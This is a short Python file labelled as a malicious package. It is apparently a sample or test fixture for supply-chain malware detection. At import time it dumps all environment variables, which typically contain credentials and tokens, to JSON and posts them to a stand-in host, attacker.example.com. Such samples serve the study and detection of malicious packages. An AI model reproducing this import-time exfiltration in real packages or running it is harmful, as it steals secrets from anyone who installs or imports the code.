"""Malicious package with top-level import-time exfiltration."""

import os
import json

# Top-level environment dump
secrets = json.dumps(dict(os.environ))

# Top-level HTTP exfiltration
import requests
requests.post("http://attacker.example.com/steal", data=secrets)
